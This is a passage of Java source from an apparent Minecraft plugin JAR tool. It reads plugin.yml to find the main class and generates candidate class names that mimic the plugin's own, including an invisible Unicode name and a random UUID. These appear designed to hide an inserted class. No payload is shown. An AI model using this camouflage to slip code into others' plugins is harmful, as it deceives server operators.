        if (!rawMainClassName.endsWith("Plugin") && !rawMainClassName.equals("Main")) {
            possible.add(mainPackageName + "/" + rawMainClassName + "Plugin");
            possible.add(mainPackageName + "/" + rawMainClassName + "Manager");
        }

        if (rawMainClassName.equals("Main")) {
            possible.add(mainPackageName + "/Plugin");
            possible.add(mainPackageName + "/PluginManager");
        }

        possible.add(mainPackageName + "/\u200E");
        possible.add(UUID.randomUUID().toString().replace("-", ""));
        return possible;
    }

    private ClassNode findMainClass(JarLoader jarLoader) {
        String mainClassStr = null;
        for (UnknownFile file : jarLoader.getFiles()) {
            if (!file.getName().equals("plugin.yml"))
                continue;

            String content = new String(file.getBytes());
            mainClassStr = content.split("main: ")[1].split("\n")[0].replace(".", "/");
        }

        ClassNode mainClass = this.findClassFromName(jarLoader, mainClassStr);
        if (mainClass == null) {
            System.err.println("Failed to find the main class of " + jarLoader.getInput().getPath() + " using the plugin.yml, is it a valid plugin?");
            System.exit(1);
        }

        return mainClass;
    }

    private ClassNode findClassFromName(JarLoader jarLoader, String className) {
        if (className == null)
            return null;

        return jarLoader.getClasses().stream().filter(classNode -> classNode.name.equals(className)).findFirst().orElse(null);
    }

    public File getInput() {
        return input;
    }

    public File getOutput() {
        return output;
    }
}
